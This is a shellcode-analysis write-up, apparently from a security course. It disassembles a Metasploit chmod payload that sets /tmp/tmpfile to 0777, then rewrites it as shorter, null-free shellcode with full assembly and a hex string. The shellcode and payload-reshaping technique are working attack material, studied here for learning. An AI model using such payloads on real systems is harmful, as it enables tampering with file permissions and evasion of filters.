

# Analyze: Read File

# Create shellcode
```bash
msfvenom -p linux/x86/chmod -f c FILE=/tmp/tmpfile MODE=0777
```


# Analysis

## Disassemble w/ bash
```bash
echo -n "\x99\x6a\x0f\x58\x52\xe8\x0d\x00\x00\x00\x2f\x74\x6d\x70\x2f\x74\x6d\x70\x66\x69\x6c\x65\x00\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```

## Disassembled Assembly

```x86asm
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80D000000        call 0x17
0000000A  2F                das
0000000B  746D              jz 0x7a
0000000D  702F              jo 0x3e
0000000F  746D              jz 0x7e
00000011  7066              jo 0x79
00000013  696C65005B68FF01  imul ebp,[ebp+0x0],dword 0x1ff685b
0000001B  0000              add [eax],al
0000001D  59                pop ecx
0000001E  CD80              int 0x80
00000020  6A01              push byte +0x1
00000022  58                pop eax
00000023  CD80              int 0x80
```

Here I will dissect the assembly piece by piece, followed by a commented version of theh code in entirety.


## Disassembled (Cleaned and commented)

Here I have cleaned and commented the code to get a better understanding of what is happening.

```x86asm
00000000  99                cdq             
00000001  6A0F              push byte +0xf      ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 15$"
                          
00000003  58                pop eax             ; int chmod(const char *pathname, mode_t mode);
00000004  52                push edx            ; 
00000005  E80D000000        call 0x17           ; jmp label1


0000000A  2F746D702F746D7066696C6500
; (ascii) /tmp/tmpfile

lebel1:
00000017  5B                pop ebx             ; ptr to: [string] /tmp/tmpfile
00000018  68FF010000        push dword 0x1ff    ; 
0000001D  59                pop ecx             ; ecx = 0x1ff - OCT = 777
0000001E  CD80              int 0x80            ; chmod("/tmp/tmpfile", 0x1ff)



00000020  6A01              push byte +0x1      
00000022  58                pop eax
00000023  CD80              int 0x80            ; exit()    
```

## Changes

The first change I made was to `cdq` and replaced it with an `xor ecx, ecx` to clear ecx's value that will be used later. I then `mul ecx` that will result in a 0 with a remainder of 0, thus clearing the `eax` and `edx` registers as well.

```x86asm
; cdq
xor ecx, ecx				; zero out ebx
mul ecx             ; zero out eax, and edx 
```

I then replace the push/pop with a `mov al` since eax was cleared in the previous `mul` command.


```x86asm
; push byte +0xf      ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 15$"             
; pop eax             ; int chmod(const char *pathname, mode_t mode);
mov al, 0xf
```

Then, instead of making a `call` instruction to push a pointer to the filename parameter to the stack, I will push the string to the stack directly. To do this, I will push `edx`, which was cleared in the previous `mul` statement and then push the string in reverse order. Then I move the stack pointer into `ebx` to be used as the parameter. 

```x86asm
; pop ebx             ; ptr to: [string] /tmp/tmpfile
push edx
push 0x656c6966         ; "elif"
push 0x706d742f         ; "pmt/"
push 0x706d742f         ; "pmt/"
mov ebx, esp
```

Since `ecx` was cleared in the original `xor` statement in the shellcode, I will set it's lower 2 bytes to `0x1ff` with a single move instruction and not worry about pushing/poping from the stack.

```x86asm
; push dword 0x1ff    ; 
; pop ecx             ; ecx = 0x1ff - OCT = 777
mov cx, 0x1ff       ; note: ecx was cleared in first xor of shellcode
```

I also remove the next push/pop and just `mov al, 0x1` for the exit statement as `eax` should be `0x0` if the `chmod()` was executed successfully.

```x86asm
; push byte +0x1      
; pop eax
mov al, 0x1        ; eax should be 0x0 from chmod() return value
```



## Final code
```x86asm
global _start

section .text
_start:
    ; cdq
    xor ecx, ecx				; zero out ebx
    mul ecx             ; zero out eax, and edx    

    ; push byte +0xf      ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 15$"             
    ; pop eax             ; int chmod(const char *pathname, mode_t mode);
    mov al, 0xf

    ; pop ebx             ; ptr to: [string] /tmp/tmpfile
    push edx
    push 0x656c6966         ; "elif"
    push 0x706d742f         ; "pmt/"
    push 0x706d742f         ; "pmt/"
    mov ebx, esp

    ; push dword 0x1ff    ; 
    ; pop ecx             ; ecx = 0x1ff - OCT = 777
    mov cx, 0x1ff       ; note: ecx was cleared in first xor of shellcode

    int 0x80            ; chmod("/tmp/tmpfile", 0x1ff)

    ; push byte +0x1      
    ; pop eax
    mov al , 0x1        ; eax should be 0x0 from chmod() return value

    int 0x80            ; exit() 
```

## Shellcode

```c
"\x31\xc9\xf7\xe1\xb0\x0f\x52\x68\x66\x69\x6c\x65\x68\x2f\x74\x6d\x70\x68\x2f\x74\x6d\x70\x89\xe3\x66\xb9\xff\x01\xcd\x80\xb0\x01\xcd\x80"
```

## Conclusion

Metasploit payload length is 37 bytes with nulls.

My payload length is 34 bytes without nulls.